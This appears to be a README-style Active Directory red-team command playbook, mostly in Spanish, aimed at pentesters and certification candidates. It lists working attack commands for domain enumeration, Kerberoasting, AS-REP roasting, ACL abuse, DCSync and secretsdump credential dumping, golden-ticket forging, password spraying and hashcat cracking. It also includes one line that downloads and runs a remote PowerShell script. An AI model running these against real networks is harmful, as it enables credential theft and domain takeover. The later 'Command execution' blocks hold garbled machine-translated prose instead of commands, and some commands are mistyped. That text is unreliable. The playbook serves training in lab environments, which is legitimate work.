# 🏛️ Active Directory Red Team Playbook & Exploitation Guide

<p align="center">
  <a href="https://araizcorp.tech"><img src="https://img.shields.io/badge/Official_Website-araizcorp.tech-1f425f?style=for-the-badge&logo=firefox" /></a>
  <a href="https://academy.araizcorp.tech"><img src="https://img.shields.io/badge/Academy_Labs-academy.araizcorp.tech-red?style=for-the-badge&logo=target" /></a>
  <img src="https://img.shields.io/badge/Commands-1374+-brightgreen?style=for-the-badge" />
</p>

---

A battle-tested, enterprise-grade **Active Directory Offensive Playbook** covering real-world post-exploitation, Kerberos protocol abuse, certificate service vulnerabilities (AD CS), and domain dominance methodologies, authored by [AraizCorp](https://araizcorp.tech).

Designed for penetration testers, Red Team operators, and enterprise security auditors preparing for high-level security assessments and certifications (*CRTP, CRTE, CRTL, OSCP, CPTS*).

---

## 📑 Table of Contents

- [01 — Domain Reconnaissance & Network Enumeration](#01-domain-reconnaissance-network-enumeration) (781 commands)
- [02 — LDAP Querying & Domain User Profiling](#02-ldap-querying-domain-user-profiling) (34 commands)
- [03 — Kerberos: AS-REP Roasting (Pre-Authentication Attacks)](#03-kerberos-as-rep-roasting-pre-authentication-attacks) (2 commands)
- [04 — Kerberos: Service Principal Names (SPN) & Kerberoasting](#04-kerberos-service-principal-names-spn-kerberoasting) (20 commands)
- [05 — Kerberos Delegation Abuse (Unconstrained, Constrained & RBCD)](#05-kerberos-delegation-abuse-unconstrained-constrained-rbcd) (16 commands)
- [06 — Active Directory DACL / ACL Abuse (GenericAll, WriteDacl, Shadow Credentials)](#06-active-directory-dacl-acl-abuse-genericall-writedacl-shadow-credentials) (29 commands)
- [07 — Active Directory Certificate Services (AD CS - ESC1 to ESC8)](#07-active-directory-certificate-services-ad-cs---esc1-to-esc8) (16 commands)
- [08 — Lateral Movement & Remote Authentication (WinRM, SMB, WMI, PsExec)](#08-lateral-movement-remote-authentication-winrm-smb-wmi-psexec) (80 commands)
- [09 — Credential Dumping (LSASS, NTDS.dit, SAM, DPAPI & LAPS)](#09-credential-dumping-lsass-ntdsdit-sam-dpapi-laps) (72 commands)
- [10 — Domain Dominance & Persistence (DCSync, Golden & Silver Tickets, Skeleton Key)](#10-domain-dominance-persistence-dcsync-golden-silver-tickets-skeleton-key) (31 commands)
- [11 — Advanced Active Directory Tooling & Operations](#11-advanced-active-directory-tooling-operations) (293 commands)
- [🎓 Advanced Hands-On Active Directory Training](#-advanced-hands-on-active-directory-training)

---

## 01 — Domain Reconnaissance & Network Enumeration

#### Recon basico para identificar hosts Windows, shares y posibles accesos anonimos o validos.
```bash
crackmapexec smb 10.10.10.0/24 --shares
```

#### Valida credenciales y prioriza hosts con sesiones interesantes.
```bash
netexec smb 10.10.10.0/24 -u user -p pass --sessions --loggedon-users
```

#### Perfil rapido de un DC o de infraestructura AD.
```bash
nmap -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269 10.10.10.10
```

#### Prueba null session contra SMB/RPC para extraer informacion sin credenciales.
```bash
rpcclient -U '' -N 10.10.10.10
```

#### Pasada de enumeracion clasica contra un objetivo Windows o DC.
```bash
enum4linux-ng -A 10.10.10.10
```

#### Enumera usuarios y grupos desde LDAP autenticado.
```bash
ldapsearch -x -H ldap://10.10.10.10 -D 'user@corp.local' -w 'Password123!' -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName memberOf
```

#### Busca cuentas con SPN para Kerberoasting.
```bash
ldapsearch -x -H ldap://10.10.10.10 -D 'user@corp.local' -w 'Password123!' -b 'DC=corp,DC=local' '(servicePrincipalName=*)' sAMAccountName servicePrincipalName
```

#### Encuentra usuarios sin preautenticacion Kerberos para AS-REP roasting.
```bash
ldapsearch -x -H ldap://10.10.10.10 -D 'user@corp.local' -w 'Password123!' -b 'DC=corp,DC=local' '(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName
```

#### Enumeracion LDAP rapida y legible desde Linux.
```bash
windapsearch -d corp.local -u user -p 'Password123!' --users --groups --computers 10.10.10.10
```

#### Si tienes PowerView, localiza usuarios AS-REP roastables desde un host unido al dominio.
```bash
Get-DomainUser -PreauthNotRequired
```

#### Enumera usuarios validos con Kerberos.
```bash
kerbrute userenum -d corp.local --dc 10.10.10.10 users.txt
```

#### Recoge informacion para BloodHound desde Linux.
```bash
bloodhound-python -u user -p 'Password123!' -d corp.local -dc dc.corp.local -c All -ns 10.10.10.10
```

#### Recolecta datos BloodHound desde Windows cuando puedes ejecutar binarios.
```bash
SharpHound.exe -c All
```

#### Recogida mas sigilosa centrada en datos del DC.
```bash
bloodhound-python -u user -p 'Password123!' -d corp.local -dc dc.corp.local -c DCOnly
```

#### Levanta la base para consultar BloodHound en laboratorio.
```bash
neo4j console
```

#### Extrae credenciales de Group Policy Preferences si encuentras XML vulnerables.
```bash
Get-GPPPassword.py -xmlfile Groups.xml
```

#### Intenta extraer hashes locales o de dominio cuando el contexto ya lo permite.
```bash
secretsdump.py corp.local/user:'Password123!'@10.10.10.20
```

#### Inspecciona ACLs interesantes para detectar WriteDACL, GenericAll o abuso de objetos.
```bash
dacledit.py -action read -target 'CN=Domain Admins,CN=Users,DC=corp,DC=local' corp.local/user:'Password123!'
```

#### Lista objetos escribibles y ayuda a priorizar abusos de ACL.
```bash
bloodyAD --host 10.10.10.10 -d corp.local -u user -p 'Password123!' get writable
```

#### 🩸 BLOODHOUND - ANÁLISIS ACTIVE DIRECTORY
```bash
git clone https://github.com/BloodHoundAD/BloodHound.git
```

#### 🩸 BLOODHOUND - ANÁLISIS ACTIVE DIRECTORY
```bash
cd BloodHound
```

#### 🩸 BLOODHOUND - ANÁLISIS ACTIVE DIRECTORY
```bash
neo4j start
```

#### 🩸 BLOODHOUND - ANÁLISIS ACTIVE DIRECTORY
```bash
.\SharpHound.exe -c All
```

#### 🩸 BLOODHOUND - ANÁLISIS ACTIVE DIRECTORY
```bash
.\SharpHound.exe -c ACL
```

#### 🩸 BLOODHOUND - ANÁLISIS ACTIVE DIRECTORY
```bash
.\SharpHound.exe -c Session
```

#### 🩸 BLOODHOUND - ANÁLISIS ACTIVE DIRECTORY
```bash
.\SharpHound.exe -c Group
```

#### 🩸 BLOODHOUND - ANÁLISIS ACTIVE DIRECTORY
```bash
.\SharpHound.ps1 -CollectionMethod All -Domain tu_dominio.local -OutputDirectory C:\ruta\salida
```

#### 🩸 BLOODHOUND - ANÁLISIS ACTIVE DIRECTORY
```bash
sudo apt update && sudo apt install -y python3-pip
```

#### 🩸 BLOODHOUND - ANÁLISIS ACTIVE DIRECTORY
```bash
pip3 install bloodhound
```

#### 🩸 BLOODHOUND - ANÁLISIS ACTIVE DIRECTORY
```bash
bloodhound-python -u "eric.wallows" -p "PasswordHere" -d "oscp.exam" -ns "DC01.oscp.exam" -c All -zip /tmp/bloodhound_oscp.zip
```

#### 🩸 BLOODHOUND - ANÁLISIS ACTIVE DIRECTORY
```bash
bloodhound-python -u "eric.wallows" -hashes ":NTLMHASH" -d "oscp.exam" -c All -zip /tmp/bh_hash.zip
```

#### 🩸 BLOODHOUND - ANÁLISIS ACTIVE DIRECTORY
```bash
bloodhound-python -k -d "oscp.exam" -c All -zip /tmp/bloodhound_krb.zip
```

#### 🏢 FUNDAMENTOS ACTIVE DIRECTORY
```bash
Get-NetFirewallRule | Out-String -Stream | findstr "THM"
```

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
```

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LM>:<NT> <DOMAIN>/<USER> -outputfile hashes.kerberoast
```

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
```

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
```

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u user -p pass --local-groups
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
kerbrute userenum --dc dc.domain.com -d domain.com users.txt
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
bloodhound-python -u user -p password -d domain.com -ns 192.168.1.1 -c All
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
sudo mount -t cifs //10.129.14.128/share /mnt/smb -o username=guest,password=
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
sudo mount -t cifs //10.129.14.128/share /mnt/smb -o username=user,password=pass,rw
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
sudo mount -t cifs //10.129.14.128/share /mnt/smb -o username=user,password=pass,vers=3.0,sec=ntlmssp
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
hydra -l user -P rockyou.txt smb://10.129.14.128
```

#### Extraer hashes de un dominio utilizando impacket-secretsdump
```bash
impacket-secretsdump -just-dc backup@spookysec.local
```

#### Agregar un objeto de credenciales a un grupo de dominio
```bash
Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDGODD"
```

#### Agregar un miembro a un grupo de dominio
```bash
Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDGODD"
```

#### Ejecuta el programa GMSAPasswordReader.exe para leer la contraseña de la cuenta svc_apache
```bash
.\GMSAPasswordReader.exe --AccountName svc_apache
```

#### Crear una cuenta de máquina con el nombre NameFakeComputer y contraseña Password123!
```bash
New-MachineAccount -MachineAccount NameFakeComputer -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
```

#### Obtener el valor del atributo msds-allowedtoactonbehalfofotheridentity de la cuenta de máquina DC
```bash
Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
```

#### Cambiar la contraseña de un usuario de dominio
```bash
Set-DomainUserPassword -Identity UserName -AccountPassword $newpass
```

#### Activa la cuenta de un usuario para mostrar el HASH TGT sin requerir preautenticación
```bash
Get-ADUser user | Set-ADAccountControl -doesnotrequirepreauth $true
```

#### Cambiar el propietario de un objeto de dominio
```bash
Set-DomainObjectOwner -Identity user_admin -OwnerIdentity mi_user
```

#### Agregar permisos de restablecimiento de contraseña a un objeto de dominio
```bash
Add-DomainObjectAcl -TargetIdentity user_admin -PrincipalIdentity mi_user -Rights ResetPassword
```

#### Cambiar la contraseña de un usuario de dominio
```bash
Set-DomainUserPassword -Identity claire -AccountPassword $cred
```

#### Obtener información de los computadores del dominio con la propiedad ms-Mcs-AdmPwd
```bash
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
```

#### Obtiene el hash del usuario Kerberoasteable y lo guarda en un archivo llamado hashes.txt
```bash
./rubeus.exe kerberoast /simple /outfile:hashes.txt
```

#### Ejecutar la data en PowerShell y capturar la salida
```bash
iex $data 2>&1 | Out-String;
```

#### Copia el binario de Sharphound al directorio de Documentos del usuario
```bash
copy C:\Tools\Sharphound.exe ~\Documents
```

#### Ejecuta Sharphound con los métodos de recopilación All y Session, excluyendo los controladores de dominio
```bash
SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
```

#### Copia el archivo ZIP de Sharphound desde el host de Windows al directorio de trabajo actual
```bash
scp <AD_Username>@THMJMP1.za.tryhackme.com:C:/Users/<AD_Username>/Documents/<Sharphound ZIP> .
```

#### Ejecuta Bloodhound sin sandbox
```bash
bloodhound --no-sandbox
```

#### Cambiar el bosque de Active Directory
```bash
Dominios y confianzas de Active Directory > Cambiar bosque
```

#### Establecer el dominio raíz de Active Directory
```bash
za.tryhackme.com > dominio raíz
```

#### Cambiar el bosque de Active Directory
```bash
Sitios y servicios de Active Directory > Cambiar bosque
```

#### Cambiar el dominio de Active Directory
```bash
Usuarios y equipos de Active Directory > Cambiar dominio
```

#### Establecer el dominio de Active Directory
```bash
za.tryhackme.com > dominio
```

#### Enumerar usuarios de AD con filtro
```bash
Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table Name,SamAccountName -A
```

#### Enumerar grupos de AD
```bash
Get-ADGroup -Identity Administrators -Server za.tryhackme.com
```

#### Enumerar membresía de grupos de AD
```bash
Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com
```

#### Buscar objetos de AD modificados después de una fecha específica
```bash
Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com
```

#### Buscar cuentas con badPwdCount mayor que 0
```bash
Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
```

#### Recuperar información del dominio
```bash
Get-ADDomain -Server za.tryhackme.com
```

#### Cambiar la contraseña de un usuario de AD
```bash
Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
```

#### Enumerar grupos de AD con filtro de propiedad
```bash
Get-ADGroup -Identity "Tier 2 Admins" -Properties whenCreated | Select-Object -Property whenCreated
```

#### Enumerar grupos de AD con filtro de propiedad
```bash
Get-ADGroup -Identity "Enterprise Admins" -Properties SID | Select-Object -Property SID
```

#### Recuperar el contenedor de objetos eliminados del dominio
```bash
(Get-ADDomain).DeletedObjectsContainer
```

#### Realizar análisis de la estructura de Active Directory y encontrar vulnerabilidades
```bash
BloodHound
```

#### Realizar ataques de rociado de contraseñas en un dominio de Active Directory
```bash
DomainPasswordSpray
```

#### Ejecutar ataque RBCD para obtener el control del dominio
```bash
restricted based on resource delegation (RBCD)
```

#### Enumerar usuarios del dominio
```bash
enumdomusers
```

#### Enumerar grupos del dominio
```bash
enumdomgropus
```

#### Consultar miembros del grupo con el identificador 0xff0
```bash
querygroupmem 0xff0
```

#### Consultar dominio objetivo para SPNs que están ejecutándose bajo una cuenta de usuario
```bash
GetUserSPNs.py -target-domain TARGET_DOMAIN
```

#### Guardar el resultado en un archivo de salida
```bash
GetUserSPNs.py -outputfile OUTPUTFILE
```

#### Usar una dirección IP de controlador de dominio específica
```bash
GetUserSPNs.py -dc-ip ip address
```

#### Listar SPNs en un dominio
```bash
setspn.exe -L
```

#### Eliminar un SPN en un dominio
```bash
setspn.exe -X
```

#### Agregar un SPN en un dominio
```bash
setspn.exe -A
```

#### Eliminar un SPN en un dominio
```bash
setspn.exe -D
```

#### Herramienta de PowerShell para enumerar y manipular objetos de Active Directory
```bash
PowerView.exe
```

#### Obtiene la información de SPNs para la cuenta SAPService
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student -request-user SAPService -outputfile sapservices
```

#### Agregar un usuario a un grupo
```bash
Add-DomainGroupMember
```

#### Restablecer la contraseña de un usuario y agregarlo a un grupo
```bash
Set-DomainUserPasswordAdd-DomainGroupMember
```

#### Obtener ACL de un objeto de dominio
```bash
Get-DomainObjectACL
```

#### Obtener ACL de un objeto de dominio con resolución de GUIDs
```bash
Get-DomainObjectACL -ResolveGUIDs
```

#### Enumerar ACL de usuarios del dominio
```bash
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\wley'}
```

#### Enumerar ACL de un objeto de dominio con resolución de GUIDs y búsqueda de derechos
```bash
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```

#### Obtiene los miembros del grupo Help Desk Level 1
```bash
Get-ADGroup -Identity 'Help Desk Level 1' -Properties * | Select -ExpandProperty Members
```

#### Consulta en Bloodhound para encontrar el usuario con derechos CanPSRemote en un host
```bash
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

#### Obtener las ACL (Access Control List) de un objeto en el dominio
```bash
Get-ObjectAcl
```

#### Herramienta de Impacket para extraer hashes NTLM y claves Kerberos de un dominio
```bash
secretsdump.py
```

#### Herramienta de Impacket para realizar un ataque DCSync en un dominio
```bash
Invoke-DCSync
```

#### Comprobar si un usuario tiene la opción de cifrado reversible habilitada
```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'}
```

#### Obtener las ACL de un objeto en el dominio y comprobar si un usuario tiene permisos de replicación
```bash
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')}
```

#### Extraer solo hashes NTLM de un dominio utilizando secretsdump.py
```bash
secretsdump.py -just-dc-ntlmb
```

#### Obtener la fecha de cambio de contraseña de cada cuenta en el dominio utilizando secretsdump.py
```bash
secretsdump.py -pwd-last-set
```

#### Obtener el historial de contraseñas de cada cuenta en el dominio utilizando secretsdump.py
```bash
secretsdump.py -history
```

#### Obtener la lista de usuarios deshabilitados en el dominio utilizando secretsdump.py
```bash
secretsdump.py -user-statuses
```

#### Ejecuta el comando secretsdump.py y filtra la salida para encontrar el hash del usuario khartsfield
```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 | grep khartsfield
```

#### Lenguaje de consulta para BloodHound
```bash
cypher
```

#### Ejecutar una consulta Cypher en BloodHound
```bash
Raw Query
```

#### Consulta predefinida en BloodHound para encontrar hosts que permiten RDP a usuarios del dominio
```bash
Find Workstations where Domain Users can RDP
```

#### Consulta predefinida en BloodHound para encontrar servidores que permiten RDP a usuarios del dominio
```bash
Find Servers where Domain Users can RDP
```

#### Obtener el SID del dominio secundario
```bash
Get-DomainSID
```

#### Listar la unidad C: del controlador de dominio
```bash
ls \academy-ea-dc01.inlanefreight.local\c$
```

#### Obtener el SID del grupo de administradores de empresa en el dominio principal
```bash
Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
```

#### Obtener el SID del grupo de administradores de empresa en el dominio principal
```bash
Get-DomainGroup
```

#### Obtiene la información de dominio de la red
```bash
Get-NetForestDomain
```

#### Extrae credenciales de un dominio Windows
```bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

#### Busca un SID en un dominio Windows
```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```

#### Busca un SID de dominio en un dominio Windows
```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```

#### Busca un SID de administrador de dominio en un dominio Windows
```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

#### Crea un token de acceso para un usuario en un dominio Windows
```bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114 red
```

#### Extrae credenciales de un dominio Windows
```bash
impacket-secretsdump -just-dc-user bross LOGISTICS.INLANEFREIGHT.LOCAL/red@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

#### Conectar a través de WinRM a un controlador de dominio en un dominio diferente
```bash
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

#### Realiza un ataque de dumping de credenciales de dominio
```bash
lsadump::dcsync /user:LOGISTICS\krbtgt
```

#### Crea un ticket Kerberos con credenciales de dominio
```bash
kerberos::golden /user:red /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

#### Realiza un ataque Kerberoast en el dominio FREIGHTLOGISTICS.LOCAL para el usuario mssqlsvc
```bash
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

#### Ejecutar Group3r y especificar el archivo de registro
```bash
group3r.exe -f <filepath-name.log>
```

#### Mostrar ayuda y opciones de Group3r
```bash
group3r.exe -h
```

#### 🩸
```bash
-d, --domain      # Dominio objetivo
```

#### 🩸
```bash
-ns, --nameserver # DNS del dominio
```

#### 🩸
```bash
-c, --collection  # Método de colección (All, Group, Session, etc.)
```

#### Admin local en controlador de dominio
```bash
BUILTIN\Administrador
```

#### Acceso administrativo a todo el dominio
```bash
Administradores de dominio
```

#### Solo en raíz del bosque
```bash
Administradores empresariales
```

#### Puede modificar dominio/bosque
```bash
Administradores de esquemas
```

#### Gestiona servidores de dominio
```bash
Operadores de servidor
```

#### 🟦
```bash
querygroup 0x201
```

#### 🔓 Crack del hash TGS
```bash
hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
```

#### 🛠️ Añadir TTIMMONS a Server Admins
```bash
PS C:\DotNetNuke\Portals\0> $group = Convert-NameToSid "Server Admins"
```

#### 🛠️ Añadir TTIMMONS a Server Admins
```bash
PS C:\DotNetNuke\Portals\0> Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
```

#### 🧩 Autenticación en un dominio
```bash
HOSTNAME\usuario
```

#### 🧩 Autenticación en un dominio
```bash
.\usuario
```

#### 🧪 Enumeración de usuarios AD con Kerbrute
```bash
./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```

#### 🏴 Conexión al DC con Evil-WinRM
```bash
evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'
```

#### 🧨 Cracking de NTLM con Hashcat
```bash
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

#### Kerberoasting sin contraseña
```bash
GetNPUsers.py -dc-ip <IP> -usersfile users.txt dominio.local/
```

#### Crea credenciales de dominio para autenticarse como JDGODD
```bash
$cred = New-Object System.Management.Automation.PSCredential('streamio.htb\\JDGODD', $pass)
```

#### Añade al usuario JDGODD como miembro del grupo Core Staff
```bash
Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\\JDGODD"
```

#### Extrae hashes NTLM de usuarios del DC vía DCSync (necesitas permisos de replicación)
```bash
secretsdump.py DOMAIN/user@DC_IP
```

#### Ejecuta comandos WMI en el DC usando autenticación Kerberos sin contraseña gracias al ticket previamente obtenido
```bash
wmiexec.py -k -no-pass administrator@dc.intelligence.htb
```

#### Extrae hashes Kerberos TGT de usuarios sin pre-autenticación (AS-REP roasting) para crackear offline
```bash
Rubeus.exe asreproast /user:Administrator /domain:oscp.exam /dc:DC [/ou:"OU=,..."] [/ldaps] [/nowrap]
```

#### Obtiene el SID del dominio necesario para crear Golden/Silver tickets
```bash
impacket-getPac scrm.local/kimpson:kimpson -targetUser Administrator
```

#### Command execution
```bash
git clone <https://github.com/BloodHoundAD/BloodHound.git>
```

#### Command execution
```bash
.\\SharpHound.ps1 -CollectionMethod All -Domain tu_dominio.local -OutputDirectory C:\\ruta\\de\\salida
```

#### Command execution
```bash
.\\SharpHound.exe -c All
```

#### Command execution
```bash
.\\SharpHound.exe -c ACL
```

#### Command execution
```bash
.\\SharpHound.exe -c Session
```

#### Command execution
```bash
.\\SharpHound.exe -c Group
```

#### Sincroniza la hora con el DC en sistemas donde ntpdate sigue disponible.
```bash
ntpdate <DC_IP>
```

#### Command execution
```bash
Inspeccionemos al usuario con red.exe y el /dominio bandera:
```

#### Command execution
```bash
También podemos usar red.exe para enumerar grupos en el dominio con grupo neto:
```

#### Command execution
```bash
| Enumeración de Active Directory - Enumeración Usando Herramientas Legacy de Windows - VM Group 1 |  |  |
```

#### Command execution
```bash
| Enumeración de Active Directory - Enumeración Usando herramientas Legacy de Windows - VM Group 2 |  |  |
```

#### Command execution
```bash
1. Inicie VM Group 2 e inicie sesión en CLIENT75 como stephanie. Usar red.exe enumerar los usuarios y grupos en el modificado corp.com dominio para obtener la bandera.
```

#### Command execution
```bash
En el Microsoft .NETO clases relacionado para AD, encontramos el System.DirectoryServicios.ActiveDirectory espacio de nombres. Si bien hay algunas clases para elige desde aquí, nos centraremos en el Dominio Clase. Contiene específicamente una referencia a la PdcRolePropietario en el propiedades, que es exactamente lo que necesitamos. Al verificar los métodos, encontramos un método llamado GetCurrentDomain(), que devolverá el objeto de dominio para el usuario actual, en este caso stephanie.
```

#### Command execution
```bash
Dado que el nombre de host en el Propietario de PdcRole La propiedad es necesaria para nuestro Ruta LDAP, podemos extraer el nombre directamente del objeto de dominio. En caso de que necesitemos más información del objeto de dominio más adelante en nuestro guión, mantendremos el $domainObj por el momento y crear una nueva variable llamada $PDC, que extraerá el valor del Propietario de PdcRole propiedad mantenida en nuestro $domainObj variable:
```

#### Command execution
```bash
| Enumeración de Active Directory - Enumeración de Active Directory usando PowerShell - VM Group 1 |  |  |
```

#### Command execution
```bash
Este script completo buscará a través de AD y filtrará los resultados basado en el samAccountTipo de nuestra elección, luego coloque los resultados en lo nuevo $resultado variable. Luego filtrará aún más el resultados basados en dos anteponer bucles. El primer bucle extraerá el objetos almacenados en $resultado y colocarlos en el $obj variable. El segundo bucle extraerá todas las propiedades de cada objeto y almacena la información en el $prop variable. El guión lo hará entonces imprimir $prop y presente la salida en el terminal.
```

#### Command execution
```bash
Nuestro script enumera más grupos que net.exe incluyendo Imprimir Operadores, IIS_EN_NUESTROS, y otros. Esto se debe a que enumera todos los objetos AD, incluidos Dominio Local grupos (no solo globales grupos).
```

#### Command execution
```bash
| Enumeración de Active Directory - Agregar Funcionalidad de Búsqueda a nuestro Script - VM Group 1 |  |  |
```

#### Command execution
```bash
| Enumeración de Active Directory - Agregar Funcionalidad de Búsqueda a nuestro Script - VM Group 2 |  |  |
```

#### Command execution
```bash
La opción -Pass nos permite establecer una única contraseña para la prueba, o podemos enviar un archivo de lista de palabras mediante -File . También podemos probar las cuentas de administrador añadiendo el indicador -Admin . El script de PowerShell identifica automáticamente a los usuarios del dominio y les envía una contraseña.
```

#### Command execution
```bash
Podemos usar crackmapexec en Kali para realizar este tipo de rociado de contraseñas. Seleccionaremos smb como protocolo e ingresaremos la dirección IP de cualquier sistema unido a un dominio, como CLIENT75 (192.168.50.75). Luego, podemos proporcionar una lista de usuarios y contraseñas individuales para -u y -p . Además, ingresaremos el nombre de dominio para -d y proporcionaremos la opción --continue-on-success para evitar detenerse en la primera credencial válida. Para este ejemplo, crearemos un archivo de texto llamado users.txt que contenga un subconjunto de los nombres de usuario de dominio dave , jen y pete para rociar la contraseña Nexus123!.
```

#### Command execution
```bash
Usemos la versión de Windows en C:\Herramientas para realizar este ataque. Para rociar contraseñas, necesitamos especificar el comando passwordspray junto con una lista de nombres de usuario y la contraseña a rociar. También necesitaremos introducir el dominio corp.com como argumento para -d . Como antes, crearemos un archivo llamado usernames.txt en C:\Herramientas que contenga los nombres de usuario pete , dave y jen .
```

#### Command execution
```bash
Finalmente, necesitamos especificar la información de autenticación del objetivo en el formato dominio/usuario . Este es el usuario que usamos para la autenticación. En este ejemplo, usaremos pete con la contraseña Nexus123! de la sección anterior. El comando completo se muestra a continuación:
```

#### Command execution
```bash
Ya hemos recopilado todo lo necesario para ejecutar Hashcat y descifrar el hash AS-REP. Ingresamos el modo 18200 , el archivo que contiene el hash AS-REP, rockyou.txt como lista de palabras, best64.rule como archivo de reglas y --force para realizar el descifrado en nuestra máquina virtual Kali.
```

#### Command execution
```bash
Como se mencionó, también podemos realizar un ataque de AS-REP en Windows. Usaremos Rubeus , un conjunto de herramientas para interacciones y abusos de Kerberos sin procesar. Para realizar este ataque, nos conectaremos a CLIENT75 mediante RDP con el usuario de dominio jeff y la contraseña HenchmanPutridBonbon11 . A continuación, podemos abrir una ventana de PowerShell y navegar a C:\Tools , donde se encuentra Rubeus.exe .
```

#### Command execution
```bash
Dado que realizamos este ataque como usuario de dominio preautenticado, no tenemos que proporcionarle a Rubeus ninguna otra opción excepto asreproast . Rubeus identificará automáticamente las cuentas de usuario vulnerables. También añadimos la etiqueta /nowrap para evitar que se añadan nuevas líneas a los hashes AS-REP resultantes.
```

#### Command execution
```bash
Para identificar usuarios con la opción de cuenta de usuario de AD habilitada " No requerir preautenticación Kerberos" , podemos usar la función Get-DomainUser de PowerView con la opción -PreauthNotRequired en Windows. En Kali, podemos usar impacket-GetNPUsers, como se muestra en el listado 14, sin las opciones -request ni -outputfile .
```

#### Command execution
```bash
